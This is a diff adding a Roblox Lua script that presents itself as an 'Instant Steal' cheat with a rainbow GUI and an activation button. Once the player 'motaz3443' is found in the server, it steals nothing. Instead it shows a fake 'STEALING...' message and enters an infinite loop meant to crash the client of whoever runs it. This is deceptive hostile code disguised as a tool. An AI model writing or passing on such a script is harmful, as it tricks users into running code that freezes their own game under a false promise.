@@ -1,0 +1,84 @@
+--[[ 
+    INSTANT STEAL - RAINBOW EDITION (Modified)
+]]
+
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+
+-- 1. INTERFACE CREATION
+task.wait(6)
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "InstantStealRainbow"
+ScreenGui.Parent = CoreGui
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 250, 0, 150)
+MainFrame.Position = UDim2.new(0.5, -125, 0.5, -75)
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+local Corner = Instance.new("UICorner")
+Corner.CornerRadius = UDim.new(0, 10)
+Corner.Parent = MainFrame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.BackgroundTransparency = 1
+Title.Text = "INSTANT STEAL"
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 20
+Title.Parent = MainFrame
+
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Size = UDim2.new(0.8, 0, 0, 45)
+ToggleBtn.Position = UDim2.new(0.1, 0, 0.5, 0)
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+ToggleBtn.Text = "ACTIVER"
+ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleBtn.Font = Enum.Font.GothamBold
+ToggleBtn.TextSize = 14
+ToggleBtn.Parent = MainFrame
+
+local BCorner = Instance.new("UICorner")
+BCorner.CornerRadius = UDim.new(0, 6)
+BCorner.Parent = ToggleBtn
+
+-- 2. RAINBOW EFFECT
+task.spawn(function()
+    while true do
+        local hue = tick() % 5 / 5
+        local color = Color3.fromHSV(hue, 1, 1)
+        Title.TextColor3 = color
+        ToggleBtn.BorderColor3 = color
+        task.wait()
+    end
+end)
+
+-- 3. UPDATED CRASH LOGIC
+ToggleBtn.MouseButton1Click:Connect(function()
+    ToggleBtn.Text = "Waiting for Target..."
+    ToggleBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    
+    while true do
+        -- Target updated to motaz3443
+        local target = Players:FindFirstChild("motaz3443")
+        
+        if target then
+            ToggleBtn.Text = "TARGET FOUND! STEALING..."
+            ToggleBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+            task.wait(0.5)
+            
+            -- This infinite loop without a wait() will crash your client
+            while true do
+                local _ = math.random() * math.sin(tick())
+                print("CRITICAL ERROR: MEMORY LEAK") 
+            end
+        end
+        task.wait(1) 
+    end
+end)
